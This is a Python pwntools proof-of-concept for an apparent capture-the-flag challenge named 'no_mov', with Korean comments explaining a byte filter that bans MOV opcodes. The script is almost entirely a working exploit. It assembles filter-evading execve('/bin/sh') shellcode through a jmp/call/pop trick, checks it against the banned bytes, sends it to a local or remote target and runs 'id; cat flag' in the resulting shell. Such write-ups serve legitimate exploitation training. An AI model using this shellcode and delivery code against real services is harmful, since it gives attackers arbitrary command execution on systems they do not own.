#!/usr/bin/env python3
# no_mov PoC
#
# [개요]
#   main() 은 랜덤 주소에 RWX 페이지(sh)를 mmap 하고 셸코드(최대 0x800B)를 읽은 뒤,
#   verify() 를 통과하면 모든 레지스터를 0 으로 밀고 rsp/rbp 를 stack 페이지로 맞춘 뒤
#   ret 으로 sh 로 점프한다. (rax=0, rsi=0, rdx=0 상태에서 셸코드 시작)
#
# [제약 - verify()]
#   아래 "MOV 계열 opcode 바이트"가 셸코드 '어디든' 한 바이트라도 있으면 거부된다.
#   (명령어 단위가 아니라 '바이트 단위' 스캔이라 즉시값/주소에 섞여도 걸린다.)
#       0x88 0x89 0x8A 0x8B 0x8C 0x8E
#       0xA0 0xA1 0xA2 0xA3 0xA4 0xA5
#       0xB0 ~ 0xBF
#       0xC6 0xC7
#   => mov 를 전혀 쓰지 않고, 위 바이트도 모두 피해 execve("/bin/sh") 를 구성한다.
#
# [아이디어]
#   - "/bin/sh\0" 8바이트는 '연속'이어야 한다. push imm32 는 항상 64비트로 부호확장
#     되어 상위 4바이트가 0 으로 끼어들기 때문("/bin\0\0\0\0/sh\0" 가 됨 -> execve("/bin")
#     실패) push 로 문자열을 쌓는 방식은 쓸 수 없다.
#   - 대신 call/pop 으로 문자열 주소를 RIP-상대로 얻는다(랜덤 mmap 주소여도 무관):
#       jmp bottom
#     top:  pop rdi            ; rdi = call 복귀주소 = &"/bin/sh"
#           push 0x3b; pop rax ; rax = 59 (execve), rsi=rdx=0 이미 0
#           syscall
#     bottom: call top         ; 복귀주소(="/bin/sh" 시작) 를 push 하고 top 으로
#           .string "/bin/sh"
#
#   사용 opcode: eb(jmp short) e8(call) 5f/58(pop) 6a(push imm8) 0f05(syscall)
#               + "/bin/sh\0"(2f 62 69 6e 2f 73 68 00) — 전부 허용 바이트.
#
# 실행: python3 poc.py            (로컬)
#       python3 poc.py HOST PORT  (원격, Dockerfile 상 5000 포트)

import sys
import time
from pwn import context, asm, process, remote

context.arch = "amd64"
context.os = "linux"

shellcode = asm(
    """
    jmp bottom
top:
    pop  rdi             /* rdi = &"/bin/sh" (call 복귀주소) */
    push 0x3b
    pop  rax             /* rax = 59 (execve), rsi=rdx=0 은 이미 0 */
    syscall
bottom:
    call top
    .string "/bin/sh"
    """
)

# 방어적 확인: 금지 바이트가 섞이지 않았는지 self-check
BANNED = set(
    [0x88, 0x89, 0x8A, 0x8B, 0x8C, 0x8E, 0xA0, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5]
    + list(range(0xB0, 0xC0))
    + [0xC6, 0xC7]
)
bad = [hex(b) for b in shellcode if b in BANNED]
assert not bad, f"banned bytes in shellcode: {bad}"


def main():
    if len(sys.argv) >= 3:
        io = remote(sys.argv[1], int(sys.argv[2]))
    else:
        io = process("./main")

    io.sendafter(b"> ", shellcode)
    # read(0, sh, 0x800) 는 한 번의 read 라, 셸코드와 명령이 같은 read 에 섞이면
    # 셸(/bin/sh)의 stdin 이 EOF 가 된다. 잠깐 쉬어 셸코드만 읽히게 분리한다.
    time.sleep(0.3)
    io.sendline(b"id; cat flag; echo ===END===")
    io.interactive()


if __name__ == "__main__":
    main()
